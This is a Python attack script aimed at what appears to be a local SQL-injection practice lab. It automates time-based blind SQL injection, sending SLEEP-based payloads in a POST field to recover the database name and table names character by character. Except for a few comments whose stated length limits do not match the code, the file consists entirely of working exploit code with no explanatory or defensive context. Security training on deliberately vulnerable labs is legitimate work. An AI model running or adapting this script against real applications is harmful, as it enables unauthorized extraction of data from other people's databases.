import requests
import string
import time
import sys
url = "http://localhost/sql-injection-lab/1/friendlist.php"
cookies = {"PHPSESSID": "47jhemumu2hib038cmlrnp3gml"}
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
}

def extract_database_name():
    db_name = ""
    print("[+] Extracting Database Name:", end="", flush=True)
    for i in range(1, 10):  # Assuming max length of DB name is 50
        found = False
        for char in string.printable:
            ascii_val = ord(char)
            payload = f"1 AND ASCII(SUBSTRING(DATABASE(),{i},1))={ascii_val} AND SLEEP(30) --"
            data = {"friend_id": "21", "friend_id2": payload, "delete_submit": "Unfriend"}
            start_time = time.time()
            response = requests.post(url, headers=headers, data=data, cookies=cookies)
            elapsed_time = time.time() - start_time
            if elapsed_time > 30:  # If delay detected
                db_name += char
                print(char, end="", flush=True)
                found = True
                break
        if not found:
            print("\n[+] Database Name Extraction Complete!")
            break
    return db_name
def extract_table_names():
    table_names = []
    print("\n[+] Extracting Table Names:")
    for table_index in range(10):  # Assuming max 10 tables
        table_name = ""
        print(f"[+] Extracting Table {table_index + 1}: ", end="", flush=True)
        for char_index in range(1, 15):  # Assuming max length of table name is 50
            found = False
            for char in string.printable:
                ascii_val = ord(char)
                payload = f"1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {table_index},1),{char_index},1))={ascii_val} AND SLEEP(30) --"
                data = {"friend_id": "21", "friend_id2": payload, "delete_submit": "Unfriend"}
                start_time = time.time()
                response = requests.post(url, headers=headers, data=data, cookies=cookies)
                elapsed_time = time.time() - start_time
                if elapsed_time > 30:
                    table_name += char
                    print(char, end="", flush=True)
                    found = True
                    break
            if not found:
                break
        if table_name:
            table_names.append(table_name)
            print()  # Move to new line for next table
        else:
            break
    print("[+] Table Names Extraction Complete!")
    return table_names
if __name__ == "__main__":
    print("Starting Database Name Extraction...")
    db_name = extract_database_name()
    print(f"\nDatabase Name: {db_name}")
    print("\nStarting Table Names Extraction...")
    table_names = extract_table_names()
    print(f"\nExtracted Tables: {table_names}")
